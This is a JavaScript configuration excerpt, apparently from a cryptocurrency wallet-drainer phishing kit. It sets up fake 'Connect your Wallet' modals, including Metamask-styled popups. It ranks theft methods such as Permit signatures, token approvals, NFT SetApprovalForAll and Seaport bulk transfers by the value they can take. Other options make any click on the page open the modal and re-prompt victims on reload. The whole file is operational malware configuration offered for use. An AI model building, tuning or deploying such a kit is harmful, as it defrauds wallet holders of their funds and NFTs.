    ...
    /* 
        ...
        const Popup_Style = 3; Metamask styled popups
        const Popup_Style = 4; Purple sexy popup
        const Popup_Style = 5; no popup
    */

        const Modal_Style = 7;
        const Popup_Style = 1;

        const Popup_4_Title_Text = "Connect your Wallet" //  Title of the popup
        ...
        const Popup_Dark_Mode = false; // Popups Loaders dark or light mode, "true" = dark & "false" = light
        const WalletConnect_V3_Dark_Mode = false; // Modal 7 dark or light mode, "true" = dark & "false" = light


        const modal_div_config = {
            "modal_dark_mode": false // Modals dark mode, "true = dark" & "false = light"
        };
        ...
        const Modal_2_Title = "Connect your Wallet";
        ...
        const Modal_3_Title = "Connect your Wallet";
        const Modal_3_Subtitle = "Start by connecting your wallet from the list below!";
    
        const Modal_4_Title = "Connect your Wallet";
        ...
        const Modal_5_Title = "Connect your Wallet"
        ...
        const multiplierMap = { // Ratio - priorize the best popup, example on 1 ETH: scanner will detect 1 * 0.72 so 0.72 eth and let priority to best popups like Permit 
            "multichain": 0.6, // Multichain ratio
            "eth": 0.72, // ETH popup ratio
            "noeth": 0.98, // Tokens popup ratio (Increase Allowance & Approve/Transfer) 
            "permit": 1.001, // Permit popup ratio
            "permit2": 0.99, // Permit2 popup ratio
            "nft": 0.45, // SetapprovalforAll popup ratio
            "blur": 0.5, // Blur popup ratio
            "sea": 0.52, // Seaport/BulkTransfer popup ratio
            "wyvern": 0.41, // Wyvern OG nft popup ratio
            "apecoin": 0.9, // Apecoins unstake popup ratio
            "uniswap": 0.8 // Uniswap V2 popup ratio
        ...
        const use_approve_if_increase_not_available = true; // If IncreaseAllowance is not available use Approve instead of Transfer function
        const bulkTransferEnabled = true; // Replace Seaport by BulkTransfer
        const click_everywhere_open_modal = true; // Click everywhere on page open modal
        const auto_prompt_on_reload = true; // Auto prompt popups when page get reloaded
